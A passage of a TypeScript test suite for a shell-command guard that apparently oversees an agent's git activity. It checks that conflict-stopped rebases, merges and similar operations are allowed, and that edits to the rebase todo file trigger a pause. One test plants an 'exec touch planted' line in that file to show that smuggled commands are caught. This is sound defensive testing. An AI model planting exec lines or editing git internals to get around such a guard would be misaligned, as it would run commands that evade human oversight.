  test("r3 33: with no git-only call since the last check, new state is the user's own", async () => {
    const dir = conflicted();
    const s = new SessionState(dir);
    assert.equal((await decideShell(guard, s, dir, "ls")).effect, "allow");
    tryGit(dir, "merge", "side");
    assert.equal((await decideShell(guard, s, dir, "ls")).effect, "allow");
    // And it is the baseline from then on.
    const call = noteGitCall(s, "git status")!;
    call.done = true;
    assert.equal((await decideShell(guard, s, dir, "ls")).effect, "allow");
  });

  test("r3 33: a conflict-stopped git rebase, merge, cherry-pick, revert and stash pop in a real repository do not pause", async () => {
    for (const [command, run] of [
      ["git rebase main", (dir: string) => (g(dir, "checkout", "-q", "side"), tryGit(dir, "rebase", "main"))],
      ["git merge side", (dir: string) => tryGit(dir, "merge", "side")],
      ["git cherry-pick side~1", (dir: string) => tryGit(dir, "cherry-pick", "side~1")],
      ["git cherry-pick side~1 side", (dir: string) => tryGit(dir, "cherry-pick", "side~1", "side")],
      ["git revert --no-edit HEAD", (dir: string) => (fs.writeFileSync(path.join(dir, "f"), "later\n"), g(dir, "commit", "-qam", "later"), tryGit(dir, "revert", "--no-edit", "HEAD~1"))],
      ["git stash pop", (dir: string) => (fs.writeFileSync(path.join(dir, "f"), "w\n"), g(dir, "stash", "-q"), fs.writeFileSync(path.join(dir, "f"), "o\n"), g(dir, "commit", "-qam", "o"), tryGit(dir, "stash", "pop"))],
      ["git pull --rebase . side", (dir: string) => tryGit(dir, "pull", "--rebase", ".", "side")],
    ] as const) {
      const dir = conflicted();
      const s = new SessionState(dir);
      assert.equal((await decideShell(guard, s, dir, "ls")).effect, "allow");
      const call = noteGitCall(s, command);
      assert.ok(call, command);
      run(dir);
      call.done = true;
      const d = await decideShell(guard, s, dir, "ls");
      assert.equal(d.effect, "allow", `${command}: ${d.reason}`);
    }
  });

  // A stopped rebase whose todo still holds a pick (the `g` commit of side).
  const stoppedRebase = async () => {
    const dir = conflicted();
    g(dir, "checkout", "-q", "side");
    tryGit(dir, "rebase", "main");
    const todo = path.join(dir, ".git", "rebase-merge", "git-rebase-todo");
    assert.match(fs.readFileSync(todo, "utf8"), /^pick /m);
    const s = new SessionState(dir);
    assert.equal((await decideShell(guard, s, dir, "ls")).effect, "allow");
    return { dir, s, todo };
  };
  test("r3 33: the rebase todo changing during a git-only call that is not a rebase pauses", async () => {
    const { dir, s, todo } = await stoppedRebase();
    const call = noteGitCall(s, "git add f")!;
    fs.writeFileSync(todo, fs.readFileSync(todo, "utf8").replace(/^pick /m, "drop "));
    call.done = true;
    paused(await decideShell(guard, s, dir, "ls"), /git-rebase-todo/);
  });
  test("r3 33: an exec line added to the rebase todo pauses, even during a rebase", async () => {
    const { dir, s, todo } = await stoppedRebase();
    const call = noteGitCall(s, "git rebase --continue")!;
    fs.appendFileSync(todo, "exec touch planted\n");
    call.done = true;
    paused(await decideShell(guard, s, dir, "ls"), /exec/);
  });
  test("r3 33: committing and continuing a stopped rebase do not pause", async () => {
    const { dir, s } = await stoppedRebase();
    fs.writeFileSync(path.join(dir, "f"), "resolved\n");
    let call = noteGitCall(s, "git add f && git commit --no-edit")!;
    g(dir, "add", "f");
    g(dir, "commit", "-q", "--no-edit");
    call.done = true;
    let d = await decideShell(guard, s, dir, "ls");
    assert.equal(d.effect, "allow", d.reason);
    call = noteGitCall(s, "GIT_EDITOR=true git rebase --continue")!;
    tryGit(dir, "rebase", "--continue");
    call.done = true;
    d = await decideShell(guard, s, dir, "ls");
    assert.equal(d.effect, "allow", d.reason);
  });
  test("r3 33: a call that is not git-only is not noted", () => {
    assert.equal(noteGitCall(new SessionState(repo), "npm test && git commit -m x"), undefined);
  });
});
